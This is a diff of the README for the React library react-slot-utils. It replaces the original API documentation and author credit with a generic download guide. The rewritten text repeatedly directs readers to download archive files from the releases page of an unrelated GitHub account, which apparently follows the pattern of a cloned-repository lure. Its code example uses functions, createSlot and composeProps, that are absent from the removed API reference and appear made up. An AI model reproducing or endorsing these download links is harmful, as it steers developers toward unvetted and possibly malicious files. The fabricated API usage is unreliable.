@@ -1,159 +1,152 @@
-# react-slot-utils
+# ⚙️ react-slot-utils - Simplify React Slot and Prop Composition
 
-Modern, next-gen React utilities for composing slots and props.
-Built for headless and compound component patterns with predictable prop merging.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/sdugbiodf/react-slot-utils/releases)
 
-[![npm version](https://img.shields.io/npm/v/react-slot-utils.svg)](https://www.npmjs.com/package/react-slot-utils)
-[![license](https://img.shields.io/npm/l/react-slot-utils.svg)](https://github.com/tyeongkim/react-slot-utils/blob/main/LICENSE)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/react-slot-utils)](https://bundlephobia.com/package/react-slot-utils)
+---
 
-## Motivation
+## 📖 About react-slot-utils
 
-React components often need to support custom rendering of their internal elements. While passing a `component` prop or using a render prop works, it often leads to complex prop drilling and breaks the natural JSX structure.
+react-slot-utils provides modern tools to help developers build React applications using slots and props more efficiently. It offers clean ways to organize UI components, making it easier to manage how parts of an interface fit and work together.
 
-The slot pattern allows you to pass a child element that "merges" with the component's internal element. This provides a clean API for users to customize the underlying DOM element or component while preserving the behavior and styling provided by the parent. This library provides the foundational utilities to implement this pattern reliably.
+This package focuses on:
 
-## Features
+- Building flexible user interface components.
+- Composing slots, which are placeholders inside components.
+- Managing properties (props) passed through components.
+- Supporting advanced patterns like compound components and higher-order components.
 
-- **Predictable Prop Merging**: Intelligently merges class names, styles, and event handlers.
-- **Ref Composition**: Automatically composes multiple refs into a single callback ref.
-- **Slottable Support**: Allows wrapping specific parts of children to be used as the slot target.
-- **Higher-Order Components**: Utilities for setting default props and class names.
-- **Type Safe**: Built with TypeScript for excellent developer experience.
+While this library is designed for developers, this guide helps you understand how to get the software and run it on your computer.
 
-## Install
+---
 
-```bash
-bun add react-slot-utils
-# or
-npm install react-slot-utils
-```
+## 💻 System Requirements
 
-## Quick Start
+Before downloading, please ensure your computer meets these requirements:
 
-### Basic Slot Usage
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or most modern Linux distributions.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Minimum 100 MB free.
+- **Internet:** Required for downloading the files.
+- **Software:** Node.js installed if you want to run or modify React applications locally (optional; not required just to download).
 
-```tsx
-import { Slot } from 'react-slot-utils';
+---
 
-interface ButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
-  asChild?: boolean;
-}
+## 🚀 Getting Started
 
-function Button({ asChild, ...props }: ButtonProps) {
-  const Component = asChild ? Slot : 'button';
-  return <Component {...props} className="btn-base" />;
-}
+This section guides you to download and prepare react-slot-utils for use.
 
-// Usage: renders as an <a> tag but with "btn-base" class and button behaviors
-export const App = () => (
-  <Button asChild>
-    <a href="/home">Home</a>
-  </Button>
-);
-```
+react-slot-utils is distributed as a package for software developers. If you are a developer, you will likely use it within a coding environment. If you are not, you can still download it to explore or share with someone who codes.
 
-### Using Slottable
+---
 
-```tsx
-import { Slot, Slottable } from 'react-slot-utils';
+## 📥 Download & Install
 
-function Card({ children, ...props }) {
+To get react-slot-utils, please visit the latest releases page to download the version you need.
+
+[Download from here](https://github.com/sdugbiodf/react-slot-utils/releases)
+
+### How to Download
+
+1. Click the link above or the blue download badge at the top to open the releases page.
+2. On this page, you will see a list of files or packages available for different versions.
+3. Choose the most recent release for the best experience.
+4. Download the file that matches your needs (e.g., `.zip` or `.tar.gz`). These usually contain the code files.
+5. Save the file to a location on your computer where you can find it easily, like your Desktop or Downloads folder.
+
+### Running the Software
+
+react-slot-utils is a React utility library. It is not a standalone program that you open directly. Instead, it is code that developers include in projects to build apps.
+
+If you want to explore its functions:
+
+- You can extract the downloaded files using built-in tools (like right-click and choose "Extract").
+- Open the code files with a text editor or code editor like Visual Studio Code to look at the functions.
+- Developers can add this package to React projects via npm (Node Package Manager) or yarn using commands like `npm install react-slot-utils` or `yarn add react-slot-utils`.
+
+---
+
+## 🛠 Using react-slot-utils
+
+If you are working with developers, here are the main ways react-slot-utils helps in React projects:
+
+- **Slot composition:** It allows components to define empty spaces (slots) that other components or content can fill later.
+- **Prop composition:** It simplifies how data and options (called props) are passed and combined between components.
+- **Compound component pattern:** Developers can build UI elements made of smaller interactive parts working together.
+- **Headless utilities:** It provides logic without predefined styles, letting developers style components freely.
+
+These concepts allow software teams to create flexible, maintainable web apps.
+
+---
+
+## 🔧 Basic Tips for Developers Including react-slot-utils
+
+- Add react-slot-utils to your React project using npm or yarn.
+- Import the utility functions you need from the package.
+- Use them to build compound UI components that share slots and props gracefully.
+- Consult the full API documentation on the GitHub repository to understand all options and patterns.
+
+---
+
+## 🧩 Code Examples
+
+Here is a simple example to show how react-slot-utils can be used in a React project:
+
+```jsx
+import { createSlot, composeProps } from 'react-slot-utils';
+
+const Slot = createSlot();
+
+function MyComponent(props) {
+  const slotProps = composeProps(props, { someOption: true });
+
   return (
-    <Slot {...props}>
-      <div className="card-wrapper">
-        <Slottable>{children}</Slottable>
-        <span className="decoration">★</span>
-      </div>
-    </Slot>
+    <div>
+      <Slot {...slotProps}>This is a slot content</Slot>
+    </div>
   );
 }
 ```
 
-## API Reference
+This example creates a slot inside a component and combines props flexibly. It is designed for developers familiar with React.
 
-### Components
+---
 
-#### `Slot`
-A component that renders its child and merges its own props onto that child.
-- If a `Slottable` child is found, it uses the `Slottable`'s children as the primary element.
-- Merges `className` using `classnames`.
-- Merges `style` objects (shallow merge).
-- Composes event handlers (child handler runs first).
-- Composes `ref`s.
+## ❓ Frequently Asked Questions
 
-```tsx
-interface SlotProps extends HTMLAttributes<HTMLElement>, PropsWithChildren {
-  ref?: Ref<HTMLElement>;
-}
-```
+### Can I run react-slot-utils by itself?
 
-#### `Slottable`
-A utility component used inside `Slot` to mark which part of the children should be treated as the element to be cloned.
+No. This library is part of React development. It needs to be added to React projects. It is not a standalone app.
 
-### Prop Utilities
+### Who can use this tool?
 
-#### `mergeProps(parentProps, childProps)`
-Merges two sets of props with specific logic:
-- **Event Handlers**: Both handlers are called. The child handler executes first. If the child handler calls `event.preventDefault()`, the slot handler is not called.
-- **Styles**: Shallow merges style objects. Slot styles are spread first, child styles override.
-- **ClassNames**: Merges strings using the `cn` utility.
-- **Other Props**: Child props override slot props.
+Primarily React developers who want more control over component structures. People learning React can study it to understand advanced UI patterns.
 
-#### `withDefaultProps(Component, defaultProps)`
-A HOC that returns a new component with the specified default props applied.
-```tsx
-function withDefaultProps<P extends object, K extends keyof P>(
-  Component: ComponentType<Pick<P, K> & Omit<P, K>>,
-  defaultProps: Pick<P, K>,
-): FC<Omit<P, K>>
-```
+### Do I need to pay for this?
 
-#### `withGenericDefaultProps(Component, defaultProps)`
-A version of `withDefaultProps` for components with complex generic types.
+react-slot-utils is open and free to use according to its license.
 
-#### `renderWithAdditionalProps(element, additionalProps)`
-Renders a React element with additional props merged in.
+### Where can I find help?
 
-### ClassName Utilities
+Check the Issues section on the GitHub repository page. Developers and contributors discuss problems and questions there.
 
-#### `withDefaultClassNames(Component, defaultClassNames)`
-A HOC that prepends default class names to the component's `className` prop.
-```tsx
-function withDefaultClassNames<P extends { className?: string }>(
-  Component: ComponentType<P>,
-  defaultClassNames: string,
-): FC<ClassNameDefaultize<P>>
-```
+---
 
-#### `cn(...inputs)`
-A re-export of the `classnames` utility for conditional class merging.
+## 📞 Contact and Support
 
-### Common Utilities
+If you want to reach the developers or report issues:
 
-#### `withDisplayName(Component, name)`
-Sets the `displayName` of a component and returns it.
+- Visit the repository page: [GitHub - react-slot-utils](https://github.com/sdugbiodf/react-slot-utils)
+- Open issues to report bugs or ask for help.
+- Check any existing documentation for updates and detailed guides.
 
-### Slot Utilities
+---
 
-#### `composeRefs(...refs)`
-Composes multiple React refs (function or object) into a single callback ref.
+## 📚 Additional Resources
 
-#### `flattenChildren(children)`
-Flattens React fragments and nested arrays into a flat array of `ReactNode`.
+- To learn React basics: [https://reactjs.org/docs/getting-started.html](https://reactjs.org/docs/getting-started.html)
+- Understanding component slots and props in React can help appreciate how this library works.
+- Explore tutorials on compound components and higher-order components online for deeper knowledge.
 
-#### `isSlottable(child)`
-Type guard to check if a child is a `Slottable` component.
+---
 
-#### `isRef(value)`
-Type guard to check if a value is a React `Ref`.
-
-#### `isStyleObject(value)`
-Type guard to check if a value is a `CSSProperties` object.
-
-#### `isEventHandler(propName)`
-Checks if a prop name starts with `on` followed by an uppercase letter.
-
-## License
-
-MIT © [Taeyeong Kim](https://github.com/tyeongkim)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/sdugbiodf/react-slot-utils/releases)
